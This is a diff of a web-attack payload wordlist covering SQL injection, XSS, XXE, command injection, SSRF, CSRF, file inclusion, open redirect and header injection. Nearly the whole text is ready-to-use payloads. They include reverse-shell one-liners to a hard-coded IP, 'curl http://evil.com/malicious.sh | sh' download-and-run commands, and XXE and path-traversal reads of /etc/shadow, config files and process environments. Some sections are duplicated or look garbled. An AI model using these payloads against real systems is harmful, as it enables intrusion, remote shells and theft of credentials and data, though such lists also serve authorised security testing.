@@ -1,276 +1,128 @@
-# XSS Payloads
-"><script>alert('XSS')</script>
-"><img src=x onerror=alert(1)>
-"><iframe src="javascript:alert('XSS');"></iframe>
-"><svg/onload=alert(1)>
-"><object data="javascript:alert('XSS')"></object>
-"><embed src="javascript:alert('XSS')"></embed>
-"><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4="></iframe>
-"><a href="javascript:alert('XSS')">Click me</a>
-"><body onload=alert('XSS')>
-"><form action="javascript:alert('XSS')"><input></form>
-"><div onmouseover="alert('XSS')">Hover me</div>
-"><style>@import 'javascript:alert(1)';</style>
-"><video><source src="javascript:alert('XSS')"></video>
-"><a href="http://example.com" onmouseover="alert('XSS')">Hover me</a>
-"><script>fetch('http://example.com').then(response => response.text()).then(text => eval(text))</script>
-"><script src="http://example.com/xss.js"></script>
-"><button onclick="alert('XSS')">Click me</button>
-"><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4="></iframe>
-"><input value="javascript:alert('XSS')">
-"><meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
-"><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4="></iframe>
-
-# SQL Injection Payloads
+# SQL Injection (sqli)
+sqli
 ' OR '1'='1
 ' OR '1'='1' --
-' OR 'a'='a
-' OR 1=1--
-' OR 1=1#
+' OR '1'='1' /* 
+' OR '1'='1'#
+' OR 1=1
 ' OR 'x'='x
-' OR 'admin'='admin
-' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password='admin')--
-' OR 1=1#
-' UNION SELECT null, username, password FROM users--
-' UNION SELECT 1, @@version, 3--
-' AND 1=1--
-' AND 1=2--
+' AND 1=1
+' AND 'x'='x
+' AND 1=2
+' AND '1'='2
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL/*
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3/*
+' UNION SELECT NULL,username,NULL FROM users--
+' UNION SELECT NULL,@@version,NULL--
+' AND EXISTS(SELECT 1 FROM users WHERE username = 'admin' AND password = 'password')--
 ' OR 1=1 LIMIT 1--
-' AND 'a'='a
-' AND 1=1--
-' AND 1=2--
-' OR 'a'='b
-' OR 1=1--
-' OR 'admin'='admin--
-' OR 1=1# 
-' UNION SELECT null, table_name, column_name FROM information_schema.columns--
+' OR 1=1 ORDER BY 1--
+' OR 1=1 GROUP BY CONCAT(username,0x3a,password) HAVING 1=1--
 
-# IDOR Payloads
-?id=1
-?id=2
-?id=3
-?id=4
-?id=5
-?id=6
-?id=7
-?id=8
-?id=9
-?id=10
-?id=50
-?id=100
-?id=200
-?id=500
-?id=1000
-?id=5000
-?id=10000
-?id=20000
-?id=50000
-?id=100000
-?id=999999
+# XSS (xss)
+xss
+<script>alert('XSS')</script>
+"><script>alert('XSS')</script>
+<img src="javascript:alert('XSS')">
+"><img src="javascript:alert('XSS')">
+"><iframe src="javascript:alert('XSS')"></iframe>
+"><svg/onload=alert('XSS')>
+"><body onload=alert('XSS')>
+"><input type="text" value="XSS" onfocus="alert('XSS')">
+"><a href="javascript:alert('XSS')">Click me</a>
+"><object data="javascript:alert('XSS')"></object>
+"><video src="javascript:alert('XSS')"></video>
+"><embed src="javascript:alert('XSS')"></embed>
+"><style>@keyframes x{from{opacity:0;}to{opacity:1;}}body:after{animation:x 1s;content:attr(data)}</style>
+"><a href="javascript:alert('XSS')">XSS</a>
+"><button onclick="alert('XSS')">Click</button>
+"><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFBTJykuYm9keT4="></iframe>
+"><input type="text" value="XSS" onblur="alert('XSS')">
+"><form><input type="text" name="test" value="<script>alert('XSS')</script>"></form>
+"><iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
 
-# XXE Payloads
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/malicious.dtd"> ]>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts"> ]>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow"> ]>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/issue"> ]>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/user/.bash_history"> ]>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/syslog"> ]>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/messages"> ]>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/auth.log"> ]>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/secure"> ]>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/dmesg"> ]>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/kernel.log"> ]>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/mail.log"> ]>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/apt/history.log"> ]>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/apt/term.log"> ]>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/clamav/clamav.log"> ]>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/mysql/error.log"> ]>
-
-# Command Injection Payloads
-; ls -la
+# Command Injection (cmd)
+cmd
+; ls
+| ls
+&& ls
+|| ls
 ; whoami
+| whoami
+&& whoami
+|| whoami
 ; id
+| id
+&& id
+|| id
 ; uname -a
+| uname -a
+&& uname -a
+|| uname -a
 ; cat /etc/passwd
-; netcat -e /bin/sh 192.168.1.1 4444
-; curl http://evil.com/malicious.sh | sh
-; wget http://evil.com/malicious.sh -O- | sh
-; nc -e /bin/bash 192.168.1.1 4444
-; telnet 192.168.1.1 4444
-; bash -i >& /dev/tcp/192.168.1.1/4444 0>&1
-; python -c 'import os; os.system("/bin/bash -c \"ls\"")'
-; perl -e 'system("/bin/bash -c \"ls\"")'
-; ruby -e 'exec("/bin/bash -c \"ls\"")'
-; php -r 'system("ls");'
-; node -e 'require("child_process").exec("ls", console.log)'
-; powershell -c "Invoke-WebRequest http://evil.com/malicious.ps1 -UseBasicP..."
-; java -jar evil.jar
-; python -c 'import os; os.system("ls")'
-; bash -c 'ls'
+| cat /etc/passwd
+&& cat /etc/passwd
+|| cat /etc/passwd
+; netstat -an
+| netstat -an
+&& netstat -an
+|| netstat -an
+; ps aux
+| ps aux
+&& ps aux
+|| ps aux
+; curl http://malicious.com
+| curl http://malicious.com
+&& curl http://malicious.com
+|| curl http://malicious.com
+; wget http://malicious.com
+| wget http://malicious.com
+&& wget http://malicious.com
+|| wget http://malicious.com
+; echo vulnerable
+| echo vulnerable
+&& echo vulnerable
+|| echo vulnerable
+; bash -i
+| bash -i
+&& bash -i
+|| bash -i
 
-# SSRF Payloads
-http://localhost:80
-http://127.0.0.1:80
-http://169.254.169.254/latest/meta-data/
-http://localhost/admin
-http://example.com
-http://internal.example.com
-http://localhost:8080
-http://127.0.0.1:8080
-http://localhost:9200
-http://127.0.0.1:9200
-http://metadata.google.internal
-http://169.254.169.254
-http://localhost/api
-http://localhost:3000
-http://127.0.0.1:3000
-http://169.254.169.254/latest/meta-data/
-http://localhost:4000
-http://127.0.0.1:4000
-http://example.internal
-
-# CSRF Payloads
-<form action="http://example.com/submit" method="POST">
-<input type="hidden" name="amount" value="1000">
-</form>
-<img src="http://example.com/transfer?amount=1000" />
-<script>
-fetch('http://example.com/transfer', {
-  method: 'POST',
-  body: new URLSearchParams('amount=1000'),
-  credentials: 'include'
-});
-</script>
-<form action="http://example.com/change-password" method="POST">
-<input type="hidden" name="password" value="newpassword">
-</form>
-<a href="http://example.com/change-password?password=newpassword">Change Password</a>
-<form action="http://example.com/withdraw" method="POST">
-<input type="hidden" name="amount" value="1000">
-</form>
-<iframe src="http://example.com/transfer?amount=1000"></iframe>
-<script>
-document.body.innerHTML += '<img src="http://example.com/transfer?amount=1000">';
-</script>
-<img src="http://example.com/transfer?amount=1000">
-<script>
-document.cookie = "csrf=token";
-fetch('http://example.com/transfer', {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/x-www-form-urlencoded',
-    'X-CSRF-Token': 'token'
-  },
-  body: 'amount=1000'
-});
-</script>
-<form action="http://example.com/update-profile" method="POST">
-<input type="hidden" name="bio" value="newbio">
-</form>
-<a href="http://example.com/update-profile?bio=newbio">Update Bio</a>
-
-# File Inclusion (LFI/RFI) Payloads
-../../../../etc/passwd
-../../../../etc/shadow
-../../../../var/log/syslog
-../../../../var/log/messages
-../../../../var/log/auth.log
-../../../../var/log/secure
-../../../../var/log/dmesg
-../../../../var/log/kernel.log
-../../../../var/log/mail.log
-../../../../var/log/clamav/clamav.log
-../../../../var/log/mysql/error.log
-../../../../var/log/apt/history.log
-../../../../var/log/apt/term.log
-../../../../var/log/clamav/clamav.log
-../../../../var/log/mysql/error.log
-../../../../var/log/apt/history.log
-../../../../var/log/apt/term.log
-../../../../var/log/apt/term.log
-../../../../var/log/clamav/clamav.log
-../../../../var/log/mysql/error.log
-../../../../var/log/apt/history.log
-../../../../var/log/apt/term.log
-../../../../var/log/clamav/clamav.log
-../../../../var/log/mysql/error.log
-../../../../var/log/apt/history.log
-../../../../var/log/apt/term.log
-../../../../var/www/html/index.php
-../../../../var/www/html/config.php
-../../../../var/www/html/db_config.php
-../../../../var/www/html/admin/config.php
-../../../../var/www/html/includes/config.php
-../../../../var/www/html/includes/db.php
-../../../../var/www/html/includes/settings.php
-../../../../var/www/html/application/config.php
-../../../../var/www/html/wp-config.php
-../../../../var/www/html/administrator/configuration.php
-
-# Open Redirect Payloads
-http://evil.com
-http://attacker.com?redirect=http://victim.com
-http://evil.com?redirect=http://victim.com
-http://evil.com?redirect=https://victim.com
-http://evil.com?redirect=//victim.com
-http://evil.com?redirect=data:text/html,<script>alert('XSS')</script>
-http://evil.com?redirect=javascript:alert('XSS')
-http://evil.com?redirect=javascript:fetch('http://attacker.com')
-http://evil.com?redirect=javascript:eval('alert(1)')
-http://evil.com?redirect=javascript:window.location='http://attacker.com'
-http://evil.com?redirect=data:text/html,<svg/onload=alert(1)>
-http://evil.com?redirect=ftp://attacker.com
-http://evil.com?redirect=mailto:attacker@example.com
-http://evil.com?redirect=file:///etc/passwd
-http://evil.com?redirect=http://example.com#evil
-http://evil.com?redirect=../../../../etc/passwd
-http://evil.com?redirect=//attacker.com
-http://evil.com?redirect=https://attacker.com
-http://evil.com?redirect=//attacker.com:8080
-http://evil.com?redirect=http://attacker.com:8080
-
-# HTTP Header Injection Payloads
-Host: victim.com
-Host: attacker.com
-X-Forwarded-For: 127.0.0.1
-X-Forwarded-For: 192.168.1.1
-X-Forwarded-For: 1.2.3.4
-X-Forwarded-For: 0.0.0.0
-X-Forwarded-For: 255.255.255.255
-X-Forwarded-For: attacker.com
-X-Forwarded-For: 127.0.0.1, attacker.com
-X-Forwarded-For: 1.2.3.4, attacker.com
-X-Forwarded-For: 192.168.1.1, attacker.com
-X-Forwarded-For: 0.0.0.0, attacker.com
-X-Forwarded-For: 255.255.255.255, attacker.com
-X-Forwarded-For: localhost
-X-Forwarded-For: 127.0.0.1, 127.0.0.1
-X-Forwarded-For: 127.0.0.1, 192.168.1.1
-X-Forwarded-For: 192.168.1.1, 127.0.0.1
-X-Forwarded-For: 192.168.1.1, 192.168.1.1
-X-Forwarded-For: attacker.com, 192.168.1.1
-
-# Open Redirect Payloads
-http://evil.com
-http://attacker.com?redirect=http://victim.com
-http://evil.com?redirect=http://victim.com
-http://evil.com?redirect=https://victim.com
-http://evil.com?redirect=//victim.com
-http://evil.com?redirect=data:text/html,<script>alert('XSS')</script>
-http://evil.com?redirect=javascript:alert('XSS')
-http://evil.com?redirect=javascript:fetch('http://attacker.com')
-http://evil.com?redirect=javascript:eval('alert(1)')
-http://evil.com?redirect=javascript:window.location='http://attacker.com'
-http://evil.com?redirect=data:text/html,<svg/onload=alert(1)>
-http://evil.com?redirect=ftp://attacker.com
-http://evil.com?redirect=mailto:attacker@example.com
-http://evil.com?redirect=file:///etc/passwd
-http://evil.com?redirect=http://example.com#evil
-http://evil.com?redirect=../../../../etc/passwd
-http://evil.com?redirect=//attacker.com
-http://evil.com?redirect=https://attacker.com
-http://evil.com?redirect=//attacker.com:8080
-http://evil.com?redirect=http://attacker.com:8080
+# XXE (xxe)
+xxe
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<foo>&xxe;</foo>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://malicious.com/malicious.dtd"> ]>
+<root>&xxe;</root>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://malicious.com/malicious.xml"> ]>
+<root>&xxe;</root>
+<!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
+<doc>&xxe;</doc>
+<!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///etc/shadow"> ]>
+<doc>&xxe;</doc>
+<!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]>
+<doc>&xxe;</doc>
+<!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///proc/self/status"> ]>
+<doc>&xxe;</doc>
+<!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///proc/cpuinfo"> ]>
+<doc>&xxe;</doc>
+<!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///proc/meminfo"> ]>
+<doc>&xxe;</doc>
+<!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///proc/version"> ]>
+<doc>&xxe;</doc>
+<!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///proc/uptime"> ]>
+<doc>&xxe;</doc>
+<!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///proc/net/tcp"> ]>
+<doc>&xxe;</doc>
+<!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///proc/net/udp"> ]>
+<doc>&xxe;</doc>
+<!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///proc/net/route"> ]>
+<doc>&xxe;</doc>
+<!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///proc/net/dev"> ]>
+<doc>&xxe;</doc>
+<!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///proc/net/if_inet6"> ]>
+<doc>&xxe;</doc>
+<!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///proc/sys/kernel/hostname"> ]>
+<doc>&xxe;</doc>
